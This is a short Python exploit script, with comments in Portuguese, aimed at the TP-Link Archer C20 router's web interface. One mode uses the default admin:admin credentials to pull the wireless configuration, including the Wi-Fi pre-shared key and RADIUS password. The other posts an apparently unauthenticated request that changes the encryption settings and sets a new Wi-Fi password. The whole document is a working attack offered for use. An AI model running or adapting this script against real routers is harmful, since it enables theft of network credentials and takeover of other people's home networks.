# Script de exploracao do Roteador Roteador -> Wireless Dual Band AC750 Archer C20
# link do produto -> https://www.tp-link.com/br/home-networking/wifi-router/archer-c20/
import sys
import requests

if len(sys.argv) > 1:
	if(int(sys.argv[1]) == 1):
		burp0_url = "http://192.168.0.1:80/cgi?5"
		cookie={'Cookie': 'Authorization=Basic YWRtaW46YWRtaW4='}
		burp0_headers = {'Origin': 'http://192.168.0.1', 'Referer': 'http://192.168.0.1/mainFrame.htm','Content-Type':'text/plain; charset=utf-8'}
		burp0_data = '[LAN_WLAN#0,0,0,0,0,0#0,0,0,0,0,0]0,19\x0d\x0aname\x0d\x0aSSID\x0d\x0aEnable\x0d\x0aX_TP_Configuration_Modified\x0d\x0abeaconType\x0d\x0aStandard\x0d\x0aWEPEncryptionLevel\x0d\x0aWEPKeyIndex\x0d\x0aBasicEncryptionModes\x0d\x0aBasicAuthenticationMode\x0d\x0aWPAEncryptionModes\x0d\x0aWPAAuthenticationMode\x0d\x0aIEEE11iEncryptionModes\x0d\x0aIEEE11iAuthenticationMode\x0d\x0aX_TP_PreSharedKey\x0d\x0aX_TP_GroupKeyUpdateInterval\x0d\x0aX_TP_RadiusServerIP\x0d\x0aX_TP_RadiusServerPort\x0d\x0aX_TP_RadiusServerPassword\x0d\x0a'
		r = requests.post(burp0_url, headers=burp0_headers,  cookies=cookie, data=burp0_data, verify=False)
		print(r.headers)
		print(r.content)
	elif(int(sys.argv[1]) == 2):
		burp0_url = 'http://192.168.0.1:80/cgi?2'
		burp0_headers = {'Origin': 'http://192.168.0.1', 'Referer': 'http://192.168.0.1/mainFrame.htm','Content-Type':'text/plain; charset=utf-8'}
		burp0_data = '[LAN_WLAN#1,1,0,0,0,0#0,0,0,0,0,0]0,5\r\nBeaconType=11i\r\nIEEE11iAuthenticationMode=PSKAuthentication\r\nIEEE11iEncryptionModes=AESEncryption\r\nX_TP_PreSharedKey=NovaSenhaAqui\r\nX_TP_GroupKeyUpdateInterval=0\r\n'
		requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
		r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
		print(r.headers)
		print(r.content)
